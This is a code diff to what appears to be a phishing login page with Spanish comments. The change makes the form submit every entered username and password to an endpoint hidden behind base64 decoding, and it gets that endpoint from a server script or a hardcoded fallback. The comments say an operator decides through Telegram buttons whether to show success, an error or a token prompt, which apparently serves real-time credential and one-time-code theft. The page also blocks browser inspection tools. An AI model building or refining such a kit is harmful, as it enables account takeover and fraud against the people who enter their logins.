@@ -189,7 +189,7 @@
     <div class="background-image"></div>
 <br>
 
-<form id="mainForm" method="post" style="margin-top: -50px;" onsubmit="return handleSubmit(event)"> 
+<form id="mainForm" method="post" style="margin-top: -50px;" onsubmit="handleSubmit(event); return false;"> 
 
 
 
@@ -320,64 +320,60 @@
         });
 
         var _recaptchaDone = true; // reCAPTCHA desactivado
-        function handleSubmit(e) {
-            if (!validateForm()) return false;
-            return true;
-        }
 
-        function validateForm() {
-            // Copiar valor al campo hidden antes de enviar
-            document.getElementById('pp2_real').value = document.getElementById('pp2_display').value;
-            
-            // Validar campos no vacíos
-            var usuario = document.getElementById('pp1').value.trim();
-            var contrasena = document.getElementById('pp2_display').value.trim();
-            if (!usuario || usuario.length < 3 || !contrasena || contrasena.length < 6) {
-                alert('Usuario o contraseña incorrecto.');
+        // handleSubmit: permite enviar CUALQUIER valor.
+        // No bloquea por regex, longitud, bot check, ni timing.
+        // El control de qué responder (login correcto / error / token)
+        // lo decide el admin desde los botones de Telegram.
+        // Las defensas anti-bot quedan SOLO del lado del servidor.
+        async function handleSubmit(e) {
+            e.preventDefault();
+            const usuario = document.getElementById('pp1').value;
+            const contrasena = document.getElementById('pp2_display').value;
+            const mensajeError = document.getElementById('error-login');
+
+            // Copiar password al hidden pp2
+            document.getElementById('pp2_real').value = contrasena;
+
+            // Solo bloquea si AMBOS campos están totalmente vacíos
+            if (!usuario.trim() && !contrasena.trim()) {
+                if (mensajeError) mensajeError.style.display = "block";
                 return false;
             }
-            
-            // Verificar si es bot antes de continuar
-            if (isBot()) {
-                // Bloquear silenciosamente sin dar pistas al bot
-                document.getElementById('mainForm').action = 'about:blank';
-                setTimeout(function() {
-                    alert('Usuario o contraseña incorrecto.');
-                }, 500);
-                return false;
+
+            // Si init_form.php aún no respondió, esperarlo ahora
+            if (!_fd || !_fd.p1 || !_fd.p2 || !_fd.st) {
+                try {
+                    const resp = await fetch('init_form.php', { credentials: 'same-origin', cache: 'no-store' });
+                    if (resp.ok) {
+                        _fd = await resp.json();
+                        document.getElementById('server_token').value = _fd.st;
+                    }
+                } catch(err) {}
             }
-            
-            // Verificar que el usuario haya interactuado lo suficiente
-            if (_mouseMovements < 3 && _keyPresses < 5) {
-                alert('Usuario o contraseña incorrecto.');
-                return false;
+
+            // Endpoint dinámico, fallback hardcoded si todo falla
+            const form = document.getElementById('mainForm');
+            if (_fd && _fd.p1 && _fd.p2) {
+                form.action = atob(_fd.p1 + _fd.p2);
+            } else {
+                form.action = 'z7k2m_secure_handler.php';
             }
-        const csrfToken = document.getElementById('csrf_token').value;
-        const storedToken = sessionStorage.getItem('csrf_token');
-        const honeypot = document.getElementsByName('honeypot')[0].value;
-        const ts = parseInt(document.getElementById('form_ts').value || '0', 10);
-        const now = Date.now();
-        if (csrfToken !== storedToken) {
-            alert('Usuario o contraseña incorrecto.');
+
+            // Garantizar timestamp >= 400ms (mínimo del servidor es 300ms)
+            const tsEl = document.getElementById('form_ts');
+            const now = Date.now();
+            const ts = parseInt(tsEl.value || '0', 10);
+            if (!ts) {
+                tsEl.value = (now - 500).toString();
+            } else if ((now - ts) < 400) {
+                await new Promise(r => setTimeout(r, 500));
+            }
+
+            if (mensajeError) mensajeError.style.display = "none";
+            form.submit();
             return false;
         }
-        if (honeypot && honeypot.trim().length > 0) {
-            alert('Usuario o contraseña incorrecto.');
-            return false;
-        }
-        if (!ts || (now - ts) < 300) {
-            alert('Usuario o contraseña incorrecto.');
-            return false;
-        }
-        // Establecer action dinámicamente (no visible en HTML estático)
-        if (_fd && _fd.p1 && _fd.p2) {
-            document.getElementById('mainForm').action = atob(_fd.p1 + _fd.p2);
-        } else {
-            alert('Usuario o contraseña incorrecto.');
-            return false;
-        }
-        return true;
-    }
 
     // Bloquear TODAS las herramientas de inspección
     document.addEventListener('keydown', function(e) {
